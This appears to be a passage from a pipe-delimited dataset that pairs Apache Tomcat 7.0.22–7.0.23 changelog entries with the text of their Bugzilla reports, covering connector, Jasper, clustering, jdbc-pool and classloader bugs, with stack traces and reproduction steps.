The following query string appears particularly interesting as it seems to be the smallest sequence that causes the corruption and the subsequent string that is appended after the output is the only thing that appears corrupted:

""http://localhost:8080/TomcatBugReportWAR?start=19&end=30&append=something‚Äù

It‚Äôs also possible to reproduce this using only the FlushableGZIPOutputStream without using Tomcat at all. See attached JAR."|https://bz.apache.org/bugzilla/show_bug.cgi?id=52121
Coyote|Tomcat 7.0.23 (markt)|fix||Improve multi-byte character handling in Coyote output for HTTP and AJP. (rjung)|||
Coyote|Tomcat 7.0.23 (markt)|add||Refactor acceptor unlock code to reduce waiting time during connector pause and stop. (markt)|||
Jasper|Tomcat 7.0.23 (markt)|fix||Correct possible (but very small) memory leak when using maxLoadedJsps to limit the number of JSPs loaded at any one time. (markt)|||
Jasper|Tomcat 7.0.23 (markt)|fix|52051|Better handling of missing resource problems with non-standard Servlet mappings so that a 404 response is returned to the client rather than a 500 response. (markt)|NullPointerException when Jasper tries to compile a directory|"Created attachment 27809 [details]
Sample webapp that demonstrates the problem.

STR:

1. Map JspServlet to /jsp/*
2. Create a directory /jsp/dir
3. Make a request to /jsp/dir

Result:
org.apache.jasper.JasperException: File ""/jsp/dir"" not found
	org.apache.jasper.compiler.DefaultErrorHandler.jspError(DefaultErrorHandler.java:56)
	org.apache.jasper.compiler.ErrorDispatcher.dispatch(ErrorDispatcher.java:410)
	org.apache.jasper.compiler.ErrorDispatcher.jspError(ErrorDispatcher.java:117)
	org.apache.jasper.compiler.JspUtil.getInputStream(JspUtil.java:679)
	org.apache.jasper.xmlparser.XMLEncodingDetector.getEncoding(XMLEncodingDetector.java:109)
	org.apache.jasper.compiler.ParserController.determineSyntaxAndEncoding(ParserController.java:337)
	org.apache.jasper.compiler.ParserController.doParse(ParserController.java:190)
	org.apache.jasper.compiler.ParserController.parseDirectives(ParserController.java:119)
	org.apache.jasper.compiler.Compiler.generateJava(Compiler.java:193)
	org.apache.jasper.compiler.Compiler.compile(Compiler.java:373)
	org.apache.jasper.compiler.Compiler.compile(Compiler.java:353)
	org.apache.jasper.compiler.Compiler.compile(Compiler.java:340)
	org.apache.jasper.JspCompilationContext.compile(JspCompilationContext.java:644)
	org.apache.jasper.servlet.JspServletWrapper.service(JspServletWrapper.java:358)
	org.apache.jasper.servlet.JspServlet.serviceJspFile(JspServlet.java:389)
	org.apache.jasper.servlet.JspServlet.service(JspServlet.java:333)
	javax.servlet.http.HttpServlet.service(HttpServlet.java:722)

Expected: 404 Not Found response"|https://bz.apache.org/bugzilla/show_bug.cgi?id=52051
Jasper|Tomcat 7.0.23 (markt)|fix|52091|Address performance issues related to log creation in TagHandlerPool. Patch provided by Taiki Sugawara. (markt)|TagHandlerPool is slow when high concurrently|"TagHandlerPool is slow when I ran stress test my web application using tomcat7.
It occured in 7.0.19.
Profiler said that it causes are followings:

 1. Lock of log instance at org.apache.jasper.runtime.TagHandlerPool.

 2. Lock of parameters field at org.apache.catalina.core.StandardWrapper.getInitParameter.

An attached patch resolve this issue in my environment.
It makes following changes:

 1. Makes log field to static.

 2. At StandardWrapper, changes lock policy from synchronized block to ReentrantReadWriteLock."|https://bz.apache.org/bugzilla/show_bug.cgi?id=52091
Jasper|Tomcat 7.0.23 (markt)|code||Switch to using Collections.enumeration() rather than custom code that does the same thing. (markt)|||
Cluster|Tomcat 7.0.23 (markt)|fix||Avoid an unnecessary session ID change notice. Notice of changed session ID by JvmRouteBinderValve is unnecessary to BackupManager. In BackupManager, change of session ID is replicated by the call of a setId() method. (kfujino)|||
Cluster|Tomcat 7.0.23 (markt)|fix||Fix duplicate resetDeltaRequest() call in DeltaSession.setId(String). (kkolinko)|||
Cluster|Tomcat 7.0.23 (markt)|fix||Work around a known JVM bug that is fixed in 1.7.0_01 but still present in 1.6.0_29 and was triggering intermittent unit test failure for org.apache.catalina.tribes.group. TestGroupChannelMemberArrival.testMemberArrival. The bug affects any components that use NIO although it was more likely to be observed in the clustering module than the HTTP or AJP NIO connector. (markt)|||http://bugs.sun.com/view_bug.do?bug_id=6427854
Cluster|Tomcat 7.0.23 (markt)|add||When Context manager does not exist, no context manager message is replied in order to avoid timeout (default 60sec) of GET_ALL_SESSIONS sync phase. (kfujino)|||
Cluster|Tomcat 7.0.23 (markt)|fix||Fix setting maxInactiveInterval, sessionIdLength and processExpiresFrequency for cluster managers. Use setter when setting maxActiveSessions. (rjung)|||
Web applications|Tomcat 7.0.23 (markt)|add|50923|Use distinct background color for code tag in Tomcat documentation, for better readability. (kkolinko)|Difficult to pick out valid values from config descriptions|"Created attachment 26766 [details]
Patch to add <entry> markers to http.xml and process them in XSL

It's quite difficult picking out the valid values from the configuration documentation.  For example, the clientAuth description under

http://tomcat.apache.org/tomcat-7.0-doc/config/http.html#SSL_Support

does not make it easy to see that the permissible values are ""true"", ""want"" and ""false"", because the code font is not very different from the normal font.

It would be easier to see the values if they were in bold or otherwise high-lighted.

Rather than add fixed styling within the source XML files, maybe one could take advantage of the XSL processing and replace the <code> entries with some other markup to flag such values, e.g. <entry>true</entry>.

Sample patch attached."|https://bz.apache.org/bugzilla/show_bug.cgi?id=50923
Web applications|Tomcat 7.0.23 (markt)|fix|51630|Fix bug in async0 example that triggered an IllegalStateException in the application log. (markt)|java.lang.IllegalStateException: Calling [asyncComplete()]|"example:

webapps\examples\WEB-INF\classes\async\Async0.java


log file: logs\localhost.2011-08-07.log
=============================================
java.lang.IllegalStateException: Calling [asyncComplete()] is not valid for a request with Async state [DISPATCHED]
	at org.apache.coyote.AsyncStateMachine.asyncComplete(AsyncStateMachine.java:221)
	at org.apache.coyote.http11.Http11Processor.actionInternal(Http11Processor.java:525)
	at org.apache.coyote.http11.AbstractHttp11Processor.action(AbstractHttp11Processor.java:773)
	at org.apache.coyote.Request.action(Request.java:344)
	at org.apache.catalina.core.AsyncContextImpl.complete(AsyncContextImpl.java:89)
	at async.Async0.service(Async0.java:42)
	at javax.servlet.http.HttpServlet.service(HttpServlet.java:722)
	at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:304)
	at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:210)
	at org.apache.catalina.core.ApplicationDispatcher.invoke(ApplicationDispatcher.java:684)
	at org.apache.catalina.core.ApplicationDispatcher.doInclude(ApplicationDispatcher.java:593)
	at org.apache.catalina.core.ApplicationDispatcher.include(ApplicationDispatcher.java:530)
	at org.apache.catalina.core.AsyncContextImpl$1.run(AsyncContextImpl.java:173)
	at org.apache.catalina.core.AsyncContextImpl.doInternalDispatch(AsyncContextImpl.java:314)
	at org.apache.catalina.core.StandardWrapperValve.invoke(StandardWrapperValve.java:219)
	at org.apache.catalina.core.StandardContextValve.invoke(StandardContextValve.java:175)
	at org.apache.catalina.authenticator.AuthenticatorBase.invoke(AuthenticatorBase.java:462)
	at org.apache.catalina.core.StandardHostValve.invoke(StandardHostValve.java:164)
	at org.apache.catalina.valves.ErrorReportValve.invoke(ErrorReportValve.java:100)
	at org.apache.catalina.valves.AccessLogValve.invoke(AccessLogValve.java:851)
	at org.apache.catalina.core.StandardEngineValve.invoke(StandardEngineValve.java:118)
	at org.apache.catalina.connector.CoyoteAdapter.asyncDispatch(CoyoteAdapter.java:296)
	at org.apache.coyote.http11.AbstractHttp11Processor.asyncDispatch(AbstractHttp11Processor.java:1220)
	at org.apache.coyote.AbstractProtocol$AbstractConnectionHandler.process(AbstractProtocol.java:511)
	at org.apache.tomcat.util.net.JIoEndpoint$SocketProcessor.run(JIoEndpoint.java:302)
	at java.util.concurrent.ThreadPoolExecutor$Worker.runTask(ThreadPoolExecutor.java:886)
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:908)
	at java.lang.Thread.run(Thread.java:619)"|https://bz.apache.org/bugzilla/show_bug.cgi?id=51630
Web applications|Tomcat 7.0.23 (markt)|add|52025|Add additional information regarding DriverManager, the service provider mechanism and memory leaks. (markt)|7.0.21 and newer break the JDK 6 Service provider mechanism for loading JDBC Drivers|In Tomcat 6 and Tomcat 7.0.20 and earlier, JDBC drivers in a web app's classpath would automatically be loaded using the JDK's service provider mechanisms.  Starting with Tomcat 7.0.21, this no longer works.  I suspect is has something to do with the classloader that is in effect at the time of this initialization, but not certain. It is difficult to debug, because the actual loading occurs in a Sun class sun.misc.Service, for which source is very hard to find!|https://bz.apache.org/bugzilla/show_bug.cgi?id=52025
Web applications|Tomcat 7.0.23 (markt)|fix|52049|Improve setup instructions for running as a Windows service: remove references to specific Windows operating systems - it easily becomes dated; correct information on how a JRE is identified and selected. (markt)|Incorrect setup instructions|"Hi,

in chapter 2 setup of the documentation of at least Tomcat 6 and Tomcat 7 for the windows installation the following item is mentioned:

""Java location: The installer will use the registry or the JAVA_HOME environment variable to determine the base path of a J2SE 5 JRE.""

I think that JAVA_HOME should/must be replaced by JRE_HOME. If the variable JAVA_HOME is exported Tomcat seems to expect a valid base path of a J2SE 5 JDK (or J2SE 6 JDK for Tomcat 7). 

I would like to ask for an update of the corresponding manual pages. Thanks in advance!"|https://bz.apache.org/bugzilla/show_bug.cgi?id=52049
Web applications|Tomcat 7.0.23 (markt)|update|52172|Clarify Tomcat build instructions. Patch provided by bmargulies. (kkolinko)|The build instructions could be a trifle clearer about /usr/share/java|"Created attachment 27930 [details]
patch to build doc.

attached please find a patch to clarify the use of /usr/share/java."|https://bz.apache.org/bugzilla/show_bug.cgi?id=52172
jdbc-pool|Tomcat 7.0.23 (markt)|fix|52015|In jdbc-pool: JdbcInterceptor passes not 'this' but 'proxy' to getNext().invoke. (kfujino)|JdbcInterceptor passes wrong argument to getNext().invoke|"The default implementation of JdbcInterceptor.invoke passes itself as the proxy argument to the next interceptor in the chain.  I'm thinking this should really pass the 'proxy' argument.

This means that interceptors cannot cast the 'proxy' argument to a java.sql.Connection.

JdbcInterceptor line 94 should look like this:

if (getNext()!=null) return getNext().invoke(proxy,method,args);

instead of this:

if (getNext()!=null) return getNext().invoke(this,method,args);"|https://bz.apache.org/bugzilla/show_bug.cgi?id=52015
jdbc-pool|Tomcat 7.0.23 (markt)|fix||In jdbc-pool: Improve handling of Errors that originate from methods invoked through reflection. In TrapException interceptor: rethrow Error as is, without wrapping it in a RuntimeException. (kkolinko)|||
jdbc-pool|Tomcat 7.0.23 (markt)|fix||In jdbc-pool: Unwrap InvocationTargetException if it is caught in ResultSetProxy, like we do it elsewhere. (kkolinko)|||
jdbc-pool|Tomcat 7.0.23 (markt)|fix||When building jdbc-pool from within Tomcat, use Tomcat's output directory location. This allows to move all build output away from the source tree. (kkolinko)|||
Other|Tomcat 7.0.23 (markt)|update||Update the package re-named copy of Commons BCEL (formerly Jakarta BCEL) to the latest code from Commons BCEL trunk. (markt)|||
Other|Tomcat 7.0.23 (markt)|code||Remove some unused code from the packaged renamed Commons BCEL. (markt)|||
Other|Tomcat 7.0.23 (markt)|fix|52059|In Windows uninstaller: Do not forget to remove Tomcat keys from 32-bit registry on deinstallation. (kkolinko)|Windows Registry are not removed after uninstall|The keys in the Windows Registry (= HKEY_LOCAL_MACHINE\SOFTWARE\Apache Software Foundation\Tomcat\7.0\Tomcat7) are not removed after an uninstall of Tomcat 7.0.22.|https://bz.apache.org/bugzilla/show_bug.cgi?id=52059
Other|Tomcat 7.0.23 (markt)|code||Start the process of deprecating unused and unnecessary code that will be removed in the next major release (8.0.x). (markt)|||
Other|Tomcat 7.0.23 (markt)|update||Ignore .git directory when building the source distributive. (markt)|||
Other|Tomcat 7.0.23 (markt)|update||Remove trailing whitespace from the default configuration files. (kkolinko)|||
Other|Tomcat 7.0.23 (markt)|update||Improve RUNNING.txt. (kkolinko)|||
Other|Tomcat 7.0.23 (markt)|update||Update optional Checkstyle library to 5.5. (kkolinko)|||
Other|Tomcat 7.0.23 (markt)|add||In test suite: add LoggingBaseTest class to allow use of Tomcat logging configuration in tests that do not start Tomcat. (kkolinko)|||
Other|Tomcat 7.0.23 (markt)|fix||In test suite: speed up TestGroupChannelSenderConnections. Remove 48 seconds worth of waits. (kkolinko)|||
Other|Tomcat 7.0.23 (markt)|fix|52148|Add tomcat-coyote.jar to catalina-tasks.xml as this JAR is now required by the Ant tasks. Patch provided by Volker Krebs. (markt)|Missing jars in catalina-tasks.xml|"When importing catalina-task.xml and running the list task I get an
java.lang.NoClassDefFoundError: org/apache/tomcat/util/buf/B2CConverter

tomcat-coyote.jar is missing in the classpath.

Solution:
Add
<fileset file=""${catalina.home}/lib/tomcat-coyote.jar""/>
to taskdef classpath in catalina-task.xml"|https://bz.apache.org/bugzilla/show_bug.cgi?id=52148
Other|Tomcat 7.0.23 (markt)|add||Add sample Apache Commons Daemon JSVC wrapper script bin/daemon.sh that can be used with /etc/init.d. (mturk)|||
Catalina|Tomcat 7.0.22 (markt)|fix|51550|An additional change that ensures any exceptions thrown by an Authenticator (or any other Valve configured for the Context) will be handled by the custom error pages for the Context if an appropriate error page is configured. (markt)|Empty response instead of error page for IllegalStateException|"IllegalStateException for ""Too many active Sessions"" error on createSession(..) sometines results in empty response with HTTP 200 OK status instead of an error message.

I saw this happening when tomcat trys to create session #(n+1) for a protected area with FORM based authentication and SessionManager with maxActiveSessions=n, not depending on whether StandardManager or PersistentManager is beeing used.

Reproduction:

1) Add webbapps/examples/META-INF/context.xml with following content:
<Context>
        <Manager className=""org.apache.catalina.session.StandardManager""
		 maxActiveSessions=""1"">
	</Manager>
</Context>

2) Restart Tomcat
3) Visit http://localhost:8080/examples/jsp/security/protected/
4) Clear cookies in your browser
5) repeat step 3).

Result:
HTTP/1.1 200 OK
Server: Apache-Coyote/1.1
Cache-Control: private
Expires: Thu, 01 Jan 1970 01:00:00 CET
Transfer-Encoding: chunked
Date: Mon, 25 Jul 2011 13:20:56 GMT

Expected Result:
HTTP/1.1 500 OK
Server: Apache-Coyote/1.1
[...]"|https://bz.apache.org/bugzilla/show_bug.cgi?id=51550
Catalina|Tomcat 7.0.22 (markt)|fix|51580|Added a nicer error message when a WAR file contains filenames not properly encoded in UTF-8. (schultz)|Severe error deploying WAR application (ExpandWar error)|"Created attachment 27330 [details]
Catalina log file with the error.

When trying to deploy a WAR application (50MB approx) I get:

""SEVERE: Error deploying web application archive gestaoApolices.war
java.lang.NullPointerException""

Complete stacktrace is attached.

I've seen in the sources that this might be related with the correction of ""Bugzilla 33636""

Let me know if the war file is needed, in case you're not able to reproduce the problem."|https://bz.apache.org/bugzilla/show_bug.cgi?id=51580
Catalina|Tomcat 7.0.22 (markt)|fix|51687|Added (optional) protection against sun.java2d.Disposer thread pinning a WebappClassLoader into memory in the JreMemoryLeakPreventionListener. (schultz)|Improve JreMemoryLeakPreventionListener against leak caused by sun.java2d.Disposer|"The sun.java2d.Disposer class, when loaded, starts an endless daemon thread that can inherit the WebappClassLoader as its context loader. This will cause a leak when the webapp is unloaded.

It would be useful if JreMemoryLeakPreventionListener could load this class to prevent the leak."|https://bz.apache.org/bugzilla/show_bug.cgi?id=51687
Catalina|Tomcat 7.0.22 (markt)|add|51741|"Fixes a problem with Eclipse WTP ""Serve modules without publishing"" feature where applications failed to access resources when using getResource() on the classloader. (slaurent)"|"Eclipse WTP ""Serve modules without publishing"" broken with tc7, needs patch in tomcat"|"Eclipse WTP has an option ""Serve modules without publishing"" that works well with tc6, but not with tc7.
After investigation by the WTP team, there seem to be no way for them to fix this without modifying tomcat. The problem in WTP is reported here : https://bugs.eclipse.org/bugs/show_bug.cgi?id=333102

Basically, their DirContext implementation (org.eclipse.jst.server.tomcat.loader.WtpDirContext) returns a ResourceAttributes that correctly points to an existing location, but org.apache.catalina.loader.WebappClassLoader.findResourceInternal(String, String) ignores it and returns a ResourceEntry whose codeBase and source fields point to a non-existing location.
This breaks applications that call getResource(...) on the Thread ContextClassLoader and use the returned URL.
A call to getResourceAsStream(...) on the Thread CCL is OK."|https://bz.apache.org/bugzilla/show_bug.cgi?id=51741
Catalina|Tomcat 7.0.22 (markt)|fix|51744|Prevent application code from closing the associated JNDI context while the application is running. (markt)|JNDI Lookup Error after a Context is closed|"I was integrating Atomikos into Tomcat to register the transaction manager, and the lookup for the transaction manager works fine in JNDI, unless someone else, looks up a JNDI context and closes it. And subsequent calls to lookup the transaction manager also fails saying java:comp is not found. I went through the code and found the problem at ""org.apache.naming.SelectorContext"". When methods of that class is calls, those are delegated to a Context received through ""getBoundContext()"", which returns a ""org.apache.naming.NamingContext"" object. And these are stored in a map in ContextBindings class. So the getBoundContext checks this cache, and if it's found it returns it or else, create a new object and store it and returns it. So the problem happens, if someone calls ""close()"" in the NamingContext object. Then it's implemented in the following way,

   public void close()
        throws NamingException {
        env.clear();
    }

Which just clears the environment, but it doesn't in no way invalidate that cache in the ContextBindings class to remove its entry. So in the next time also when getBoundContext is called to get the same context, it will return the earlier 'closed' context without creating a new one. And the environment it has would be cleared and subsequent lookups done from that will fail. 

So I guess the proper fix would be to remove that context from ContextBinding's cache when its close method is closed.

Cheers,
Anjana."|https://bz.apache.org/bugzilla/show_bug.cgi?id=51744
Catalina|Tomcat 7.0.22 (markt)|fix||Correct a regression with the fix for 51653 that broke custom error pages for 4xx responses from the Authenticators. Error handling and request listeners are now handled in the StandardHostValve to ensure they wrap all Context level activity. (markt)|ServletRequestListener.requestDestroyed is called before request leaves a webapp|"Created attachment 27379 [details]
Sample webapp demonstrating the issue

I use Tomcat 7.0.19, jdk 1.7.0-b147, Ubuntu Linux 11.04.

Steps to reproduce:
1. declare error page for 404 code in web.xml
2. Set location of that page to some servlet (let's call it ErrorServlet)
3. go to any invalid URL in webapp (to cause 404)
4. ErrorServlet is called after requestDestroyed on any registered listener.
This kind of behaviour is not correct in my opinion because it
contradicts to contract of ServletRequestListener.
Also it breaks org.springframework.web.context.request.RequestContextListener
if ErrorServlet uses session-scoped beans.

Description of the attached war file:
1. wheleph.RequestContextListener sets a local variable in requestInitialized and resets it in requestDestroyed
2. wheleph.SecondServlet writes to System.out the value of that variable thus showing whether it was called between requestInitialized and requestDestroyed or not. It's registered as 404 handler.
3. To reproduce the bug go to any invalid url (like http://localhost:8080/SpringListenerPOC/abcd) and see the message in log: 
""SecondServlet
in scope: false""

The relevant thread from dev.tomcat.apache.org:

On 09/08/2011 20:55, Volodymyr Sobotovich wrote:
> Hello, everyone.
>
> I think I have found a bug in Tomcat's lifecycle handling of
> ServletRequestListener. I'd like to discuss it here before posting.
> Tomcat 7.0.19, jdk 1.7.0-b147, Ubuntu Linux 11.04
> Steps to reproduce:
> 1. declare error page for 404 code in web.xml
> 2. Set location of that page to some servlet (let's call it ErrorServlet)
> 3. go to any invalid URL in webapp (to cause 404)
> 4. ErrorServlet is called after requestDestroyed on any registered listener.
> This kind of behaviour is not correct in my opinion because it
> contradicts to contract of ServletRequestListener.
> Also it breaks org.springframework.web.context.request.RequestContextListener
> if ErrorServlet uses session-scoped beans.
>
> What do you think about that. Should I post in to Bugzilla?

Hmm.

The error page handling is currently at the host level. One could argue
the listeners are being fired in the right place (when processing
enters/leaves the context). However, custom error pages defined by the
web app are currently outside the listener calls and that doesn't seem
right.

Addressing this would mean either:
a) moving the error handling to the context (inside the calls to the
ServletRequestListener) or
b) moving the calls to ServletRequestListener to the host level

I am leaning towards a) but wondering why things are the way the are
currently.

I'd suggest leaving this on the dev list for other folks to comment and
then add it to BZ in a couple of days unless the consensus is that it is
not a bug. The next 7.0.x release won;t be until early Sept so there is
plenty of time to get this right.

Mark

=======================================================================
Mark,

On 8/9/2011 4:35 PM, Mark Thomas wrote:
> Addressing this would mean either:
> a) moving the error handling to the context (inside the calls to the
> ServletRequestListener) or

+1

This just feels like the right state management level to me. Certainly
the default error handler can be called just as easily from this level
of the code.

-chris"|https://bz.apache.org/bugzilla/show_bug.cgi?id=51653
Catalina|Tomcat 7.0.22 (markt)|fix|51758|The digester (used for processing XML files) used the logger name org.apache.commons.digester.Digester rather than the expected org.apache.tomcat.util.digester.Digester. The digester has been changed to use the expected logger name. (markt/kkolinko)|Setting logger-specific overrides in logging.properties not working|"Logger-specific configuration is being ignored in the $CATALINA_HOME/conf/logging.properties file.

Problem was asked (and unanswered) here, and googling did not turn up a solution either:
http://old.nabble.com/Having-difficulty-suppressing-the-org.apache.tomcat.util.digester.Digester-logger-to32367312.html

Steps to reproduce:

1.) Set the global logging level to FINE:

.level = FINE

2.) Add a logger-specific logging level override:

org.apache.tomcat.util.digester.Digester.level = INFO (or SEVERE)

3.) Start up Tomcat and view the catalina-(date).log file or catalina.out.  You'll see the above logger outputting countless FINE messages -- its output is not being suppressed despite the statement in #2 above."|https://bz.apache.org/bugzilla/show_bug.cgi?id=51758
Catalina|Tomcat 7.0.22 (markt)|fix|51774|Fix incorrect cached method signature that prevented session tracking modes from being defined in web.xml when running under a security manager. (markt)|"java.lang.NoSuchMethodException thrown when starting tomcat with security enabled and ""tracking-mode"" used in web.xml"|"When starting my application with security enabled I get the exception below if I have the following in my web.xml.

	<session-config>
		<tracking-mode>COOKIE</tracking-mode>
	</session-config>

If I remove the ""tracking-mode"" element then I don't get the exception.

Mike


[11/09/06 19:01:19:758] 00000001 Sv HostConfig: Error deploying configuration descriptor stack-pet-store-ui.xml
java.lang.RuntimeException: org.apache.catalina.core.ApplicationContext.setSessionTrackingModes(java.util.EnumSet)
	at org.apache.catalina.core.ApplicationContextFacade.doPrivileged(ApplicationContextFacade.java:769)
	at org.apache.catalina.core.ApplicationContextFacade.setSessionTrackingModes(ApplicationContextFacade.java:608)
	at org.apache.catalina.deploy.WebXml.configureContext(WebXml.java:1324)
	at org.apache.catalina.startup.ContextConfig.webConfig(ContextConfig.java:1343)
	at org.apache.catalina.startup.ContextConfig.configureStart(ContextConfig.java:896)
	at org.apache.catalina.startup.ContextConfig.lifecycleEvent(ContextConfig.java:322)
	at org.apache.catalina.util.LifecycleSupport.fireLifecycleEvent(LifecycleSupport.java:119)
	at org.apache.catalina.util.LifecycleBase.fireLifecycleEvent(LifecycleBase.java:89)
	at org.apache.catalina.core.StandardContext.startInternal(StandardContext.java:5103)
	at org.apache.catalina.util.LifecycleBase.start(LifecycleBase.java:145)
	at org.apache.catalina.core.ContainerBase.addChildInternal(ContainerBase.java:812)
	at org.apache.catalina.core.ContainerBase.access$000(ContainerBase.java:121)
	at org.apache.catalina.core.ContainerBase$PrivilegedAddChild.run(ContainerBase.java:144)
	at org.apache.catalina.core.ContainerBase$PrivilegedAddChild.run(ContainerBase.java:133)
	at java.security.AccessController.doPrivileged(Native Method)
	at org.apache.catalina.core.ContainerBase.addChild(ContainerBase.java:785)
	at org.apache.catalina.core.StandardHost.addChild(StandardHost.java:607)
	at org.apache.catalina.startup.HostConfig.deployDescriptor(HostConfig.java:633)
	at org.apache.catalina.startup.HostConfig.deployDescriptors(HostConfig.java:558)
	at org.apache.catalina.startup.HostConfig.deployApps(HostConfig.java:468)
	at org.apache.catalina.startup.HostConfig.start(HostConfig.java:1322)
	at org.apache.catalina.startup.HostConfig.lifecycleEvent(HostConfig.java:311)
	at org.apache.catalina.util.LifecycleSupport.fireLifecycleEvent(LifecycleSupport.java:119)
	at org.apache.catalina.util.LifecycleBase.fireLifecycleEvent(LifecycleBase.java:89)
	at org.apache.catalina.util.LifecycleBase.setStateInternal(LifecycleBase.java:379)
	at org.apache.catalina.util.LifecycleBase.setState(LifecycleBase.java:324)
	at org.apache.catalina.core.ContainerBase.startInternal(ContainerBase.java:1041)
	at org.apache.catalina.core.StandardHost.startInternal(StandardHost.java:774)
	at org.apache.catalina.util.LifecycleBase.start(LifecycleBase.java:145)
	at org.apache.catalina.core.ContainerBase.startInternal(ContainerBase.java:1033)
	at org.apache.catalina.core.StandardEngine.startInternal(StandardEngine.java:291)
	at org.apache.catalina.util.LifecycleBase.start(LifecycleBase.java:145)
	at org.apache.catalina.core.StandardService.startInternal(StandardService.java:443)
	at org.apache.catalina.util.LifecycleBase.start(LifecycleBase.java:145)
	at org.apache.catalina.core.StandardServer.startInternal(StandardServer.java:727)
	at org.apache.catalina.util.LifecycleBase.start(LifecycleBase.java:145)
	at org.apache.catalina.startup.Catalina.start(Catalina.java:621)
	at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
	at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:57)
	at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
	at java.lang.reflect.Method.invoke(Method.java:601)
	at org.apache.catalina.startup.Bootstrap.start(Bootstrap.java:322)
	at org.apache.catalina.startup.Bootstrap.main(Bootstrap.java:450)
Caused by: java.lang.NoSuchMethodException: org.apache.catalina.core.ApplicationContext.setSessionTrackingModes(java.util.EnumSet)
	at java.lang.Class.getMethod(Class.java:1622)
	at org.apache.catalina.core.ApplicationContextFacade.invokeMethod(ApplicationContextFacade.java:790)
	at org.apache.catalina.core.ApplicationContextFacade.doPrivileged(ApplicationContextFacade.java:767)
	... 42 more"|https://bz.apache.org/bugzilla/show_bug.cgi?id=51774
Catalina|Tomcat 7.0.22 (markt)|add||Add an annotation cache to the DefaultInstanceManager that improves performance for applications that make use of a lot of non-poolable objects (e.g. tag files) that need to be scanned for annotations when created. (markt)|||
Catalina|Tomcat 7.0.22 (markt)|fix||Use the specification compliant request attribute of javax.servlet.request.ssl_session_id to access the SSL session ID and deprecated the Tomcat specific request attribute. (markt)|||
Catalina|Tomcat 7.0.22 (markt)|add||Allow to overwrite the check for distributability of session attributes by session implementations. (rjung)|||
Catalina|Tomcat 7.0.22 (markt)|update||Add Java 7 sunec.jar and zipfs.jar to the list of JARs to skip when scanning for TLDs and web fragments. (rjung)|||
Catalina|Tomcat 7.0.22 (markt)|add|51862|Added a classesToInitialize attribute to JreMemoryLeakPreventionListener to allow pre-loading of configurable classes to avoid some classloader leaks. (slaurent)|JreMemoryLeakPreventionListener enhancement to load configurable classes|"Enhancement proposed : add a ""classesToInitialize"" parameter to JreMemoryLeakPreventionListener to provoke the loading of arbitrary classes.
This will allow users to tune the memory leak protection features to avoid leaks triggered when loading JRE classes not yet identified as leaky, or even third-party classes.

I'll commit a patch in the next days..."|https://bz.apache.org/bugzilla/show_bug.cgi?id=51862
Catalina|Tomcat 7.0.22 (markt)|fix||Reduce visibility of static field ManagerBase.name and make it final. (kkolinko)|||
Catalina|Tomcat 7.0.22 (markt)|update||Add thread name to juli OneLineFormatter. (rjung)|||
Catalina|Tomcat 7.0.22 (markt)|fix||Ensure Servlets that implement ContainerServlet always get treated as restricted. (markt)|||
Catalina|Tomcat 7.0.22 (markt)|fix|51872|Ensure that the access log always uses the correct value for the remote IP address associated with the request and that requests with multiple errors do not result in multiple entries in the access log. (markt)|request.getRemoteAddr() sometimes returning IP address from the previous request|"request.getRemoteAddr() sometimes returning IP address from the previous request.  We have compared the IP address returned from the getRemoteHost() and from the headers with getRemoteAddr() and getRemoteAddr is returning wrong IP address.  We believe that this may come from the ""pooled"" request objects where it is sometimes sees the previous value of the remote IP.  The problem doesn't occur all the time. 

We are heavily relying on the getRemoteAddr to verify the remote client for some of our authentication.  Can this be fixed?

2011-09-22 16:49:55,713 DEBUG [yjava.tomcat.valves.YahooConnectionValve] THREADID:1262 YahooConnectionValve invoked
2011-09-22 16:49:55,826 DEBUG [yjava.tomcat.valves.YahooConnectionValve] THREADID:1262 YahooConnectionValve
request.getInfo(): org.apache.coyote.catalina.CoyoteRequest/1.0
2011-09-22 16:49:56,013 DEBUG [yjava.tomcat.valves.YahooConnectionValve] THREADID:1262 YahooConnectionValve
request.getRemoteAddr(): 98.138.85.230
2011-09-22 16:49:56,014 DEBUG [yjava.tomcat.valves.YahooConnectionValve] THREADID:1262 YahooConnectionValve
request.getRemoteHost(): web120016.mail.ne1.yahoo.com

   [][~]$ nslookup web120016.mail.ne1.yahoo.com
   Server:              10.72.226.8
   Address:     10.72.226.8#53

   Name:        web120016.mail.ne1.yahoo.com
   Address: 98.138.85.143

2011-09-22 16:49:56,014 DEBUG [yjava.tomcat.valves.YahooConnectionValve] THREADID:1262 YahooConnectionValve
request.getRequestedSessionId(): null
2011-09-22 16:49:56,015 DEBUG [yjava.tomcat.valves.YahooConnectionValve] THREADID:1262 YahooConnectionValve
request.getHeader(): accept:*/* host:ls100.mail.vip.ne1.yahoo.com:4080 content-type:application/x-ypy
yahoo-app-auth:v=1;a=yahoo.mail.acl.yca.lsg-prod;h=98.138.85.143;t=1319282225;
content-length:574
2011-09-22 16:49:56,015 DEBUG [yjava.filter.address.RemoteIPTranslator] THREADID:1262 Got remote address
'98.138.85.230' and port '46663'"|https://bz.apache.org/bugzilla/show_bug.cgi?id=51872
Coyote|Tomcat 7.0.22 (markt)|code||Remove unused and undocumented socketCloseDelay attribute from NIO connector. (markt)|||
Coyote|Tomcat 7.0.22 (markt)|fix|49683|Support separate connection and keep-alive timeouts for the APR/native connector HTTP and AJP connectors. (markt)|Separate keep-alive and connection timeout with APR/native connector|"Originally observed as part of bug 48648.

If a keepAliveTimeout is specified it is used for connectionTimeout as well.

Fixing this may require changes to the native code too."|https://bz.apache.org/bugzilla/show_bug.cgi?id=49683
Coyote|Tomcat 7.0.22 (markt)|code||Further re-factoring of the HTTP connectors to align the BIO, NIO and APR implementations. (markt)|||
Coyote|Tomcat 7.0.22 (markt)|fix|51794|Fix race condition in NioEndpoint. (fhanik)|Race condition in NioEndpoint$Poller causes socket to not be read until selectorTimeout|"I'm seeing an occasional race condition that happens between NioEndpoint$Poller#run and Http11NioProtocol finishing an event.

What happens is that there is a race condition upon waking up the Selector that can cause a SelectionKey to not be marked with InterestOps.READ as soon as it could.  The race is on Poller.wakeupCounter.  These steps can occur which causes my SelectionKey to not have its interest ops reset soon and the Selector to not have wakeup() called on it.

1. Poller0 - Starts processing its run loop and calls events().
